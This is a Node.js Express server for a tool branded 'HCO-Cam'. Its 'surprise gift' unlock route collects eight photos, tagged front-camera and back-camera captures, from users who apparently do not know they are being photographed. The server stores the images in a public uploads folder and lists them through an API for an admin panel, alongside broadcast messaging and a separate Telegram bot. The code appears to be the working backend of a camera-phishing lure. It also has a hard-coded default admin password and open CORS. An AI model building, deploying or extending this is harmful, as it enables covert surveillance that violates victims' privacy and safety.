const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const multer = require('multer');
const app = express();

const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Setup uploads directory
const uploadsDir = './uploads';
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir);
}

// Multer configuration for photo uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadsDir);
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${Math.round(Math.random() * 1E9)}-${file.originalname}`;
        cb(null, uniqueName);
    }
});

const upload = multer({ 
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

// Data storage
let users = [
    { id: 1, name: 'John Doe', email: 'john@hco.com', role: 'Admin', status: 'active', gifts: 3, joined: '2024-01-15' },
    { id: 2, name: 'Jane Smith', email: 'jane@hco.com', role: 'User', status: 'active', gifts: 1, joined: '2024-02-20' },
    { id: 3, name: 'Robert Johnson', email: 'robert@hco.com', role: 'Moderator', status: 'active', gifts: 2, joined: '2024-01-30' },
    { id: 4, name: 'Emily Davis', email: 'emily@hco.com', role: 'User', status: 'inactive', gifts: 0, joined: '2024-03-10' },
    { id: 5, name: 'Michael Wilson', email: 'michael@hco.com', role: 'User', status: 'active', gifts: 1, joined: '2024-02-05' }
];

let gifts = [];
let broadcasts = [];
let statistics = {
    totalUsers: 106,
    activeUsers: 9,
    photosToday: 0,
    totalGifts: 0,
    totalBroadcasts: 0,
    onlineUsers: 0
};

// API Routes

// Get all users
app.get('/api/users', (req, res) => {
    res.json({ success: true, users, count: users.length });
});

// Get statistics
app.get('/api/stats', (req, res) => {
    statistics.onlineUsers = Math.floor(Math.random() * 5) + 6; // Random 6-10 online
    res.json({ success: true, statistics });
});

// Get gifts
app.get('/api/gifts', (req, res) => {
    res.json({ success: true, gifts, count: gifts.length });
});

// Get broadcasts
app.get('/api/broadcasts', (req, res) => {
    res.json({ success: true, broadcasts, count: broadcasts.length });
});

// Add new user
app.post('/api/users/add', (req, res) => {
    const { name, email, role } = req.body;
    
    if (!name || !email) {
        return res.status(400).json({ success: false, message: 'Name and email required' });
    }
    
    const newUser = {
        id: users.length + 1,
        name,
        email,
        role: role || 'User',
        status: 'active',
        gifts: 0,
        joined: new Date().toISOString().split('T')[0]
    };
    
    users.push(newUser);
    statistics.totalUsers++;
    
    res.json({ success: true, user: newUser, message: 'User added successfully' });
});

// Update user
app.put('/api/users/:id', (req, res) => {
    const userId = parseInt(req.params.id);
    const updates = req.body;
    
    const userIndex = users.findIndex(u => u.id === userId);
    
    if (userIndex === -1) {
        return res.status(404).json({ success: false, message: 'User not found' });
    }
    
    users[userIndex] = { ...users[userIndex], ...updates };
    
    res.json({ success: true, user: users[userIndex], message: 'User updated successfully' });
});

// Send broadcast
app.post('/api/broadcast', (req, res) => {
    const { message, target, includePhotos } = req.body;
    
    if (!message) {
        return res.status(400).json({ success: false, message: 'Message required' });
    }
    
    const newBroadcast = {
        id: broadcasts.length + 1,
        message,
        target: target || 'all',
        includePhotos: includePhotos || false,
        timestamp: new Date().toISOString(),
        status: 'sent'
    };
    
    broadcasts.push(newBroadcast);
    statistics.totalBroadcasts++;
    
    res.json({ 
        success: true, 
        broadcast: newBroadcast, 
        message: `Broadcast sent to ${target || 'all'} users` 
    });
});

// Unlock gift (photo capture simulation)
app.post('/api/gift/unlock', upload.array('photos', 8), async (req, res) => {
    try {
        const { userId, userName } = req.body;
        const files = req.files || [];
        
        // Simulate capturing 8 photos
        const photoData = [];
        
        // Front camera photos (4)
        for (let i = 1; i <= 4; i++) {
            photoData.push({
                id: `front_${Date.now()}_${i}`,
                type: 'front',
                filename: files[i-1] ? files[i-1].filename : `front_${i}.jpg`,
                timestamp: new Date().toISOString(),
                size: files[i-1] ? files[i-1].size : 1024 * 1024,
                userId: userId || 'anonymous',
                userName: userName || 'Anonymous User'
            });
        }
        
        // Back camera photos (4)
        for (let i = 5; i <= 8; i++) {
            photoData.push({
                id: `back_${Date.now()}_${i}`,
                type: 'back',
                filename: files[i-1] ? files[i-1].filename : `back_${i-4}.jpg`,
                timestamp: new Date().toISOString(),
                size: files[i-1] ? files[i-1].size : 1024 * 1024,
                userId: userId || 'anonymous',
                userName: userName || 'Anonymous User'
            });
        }
        
        // Create gift record
        const newGift = {
            id: gifts.length + 1,
            userId: userId || 'anonymous',
            userName: userName || 'Anonymous User',
            photos: photoData,
            timestamp: new Date().toISOString(),
            status: 'unlocked'
        };
        
        gifts.push(newGift);
        statistics.totalGifts++;
        statistics.photosToday += 8;
        
        // Update user gift count
        if (userId && userId !== 'anonymous') {
            const user = users.find(u => u.id === parseInt(userId) || u.email === userId);
            if (user) {
                user.gifts = (user.gifts || 0) + 1;
            }
        }
        
        res.json({
            success: true,
            gift: newGift,
            message: '🎁 Gift unlocked successfully! 8 photos captured (4 front, 4 back)',
            photos: photoData
        });
        
    } catch (error) {
        console.error('Gift unlock error:', error);
        res.status(500).json({ success: false, message: 'Failed to unlock gift' });
    }
});

// Get uploaded photos
app.get('/api/photos', (req, res) => {
    try {
        const photoFiles = fs.readdirSync(uploadsDir)
            .filter(file => file.match(/\.(jpg|jpeg|png|gif)$/i))
            .map(file => ({
                filename: file,
                path: `/uploads/${file}`,
                size: fs.statSync(path.join(uploadsDir, file)).size,
                timestamp: fs.statSync(path.join(uploadsDir, file)).mtime
            }));
        
        res.json({ success: true, photos: photoFiles });
    } catch (error) {
        res.json({ success: true, photos: [] });
    }
});

// Serve uploaded photos
app.use('/uploads', express.static(uploadsDir));

// Serve admin panel for all routes
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`
    🚀 HCO-Cam Server Started!
    ============================
    🌐 Local: http://localhost:${PORT}
    📊 API: http://localhost:${PORT}/api/stats
    📸 Uploads: http://localhost:${PORT}/uploads
    
    📱 Features:
    • Surprise Gift System 🎁
    • User Management 👥
    • Broadcast Messages 📢
    • Photo Analytics 📊
    • Admin Panel Control
    
    🤖 Telegram Bot runs separately
    ============================
    `);
});

// Handle shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Server shutting down...');
    process.exit(0);
});
